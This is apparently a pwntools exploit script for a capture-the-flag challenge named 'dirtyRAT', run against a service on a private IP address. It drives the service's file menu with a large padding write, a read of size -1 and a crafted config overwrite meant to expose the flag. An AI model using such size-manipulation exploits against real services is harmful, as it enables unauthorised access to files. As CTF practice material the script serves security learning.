#!/usr/bin/python3

from pwn import *

# r = process("./dirtyRAT")
context.log_level = 'debug'
# context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']
context.terminal = ["cmd.exe", "/c", "start", "wt.exe", '-w', '0', 'split-pane', "wsl", "-d", "Ubuntu", "-e", "sh", "-c"]
# gdb.attach(r, '''
#     b main
#     ''')
r = remote("192.168.233.145", 10010)

def sl(a, b):
    r.sendlineafter(a, b)

def ls():
    sl("Your choice: ", "1")

def read(filename, size):
    sl("Your choice: ", "2")
    sl("Insert filename: ", filename)
    sl("How many bytes to read? (Max 127 eheheeheh): ", str(size))


def write(filename, data, padd_size):
    sl("Your choice: ", "3")
    sl("Insert filename: ", filename)
    sl("Write data (ASCII, non space and max 256, upgrade plan for more features): ", data)
    sl("How many padding bytes? ", str(padd_size))


m_data = """
##DIRTY CONFIG HEADER
flag
cards
priv
secr
pasw
"""

data = "flag\x00"

#write("conf", "M\x00", 0)
log.info("Trying to write to conf\n")
write("conf", "\x00", 65536)
# pause()
log.info("Trying to read from conf with size -1...\n")
read("conf", -1)
# pause()
log.info("Trying to read data from conf with size 33...\n")
read("conf", 33)
# pause()
log.info("Writing date into conf file, now the file pointer moves to offset 0x20\n")
write("conf", data, 0)
# write("conf", m_data, 1)
# pause()
# log.info("Reading flag...")
# read("flag", 33)



r.interactive()
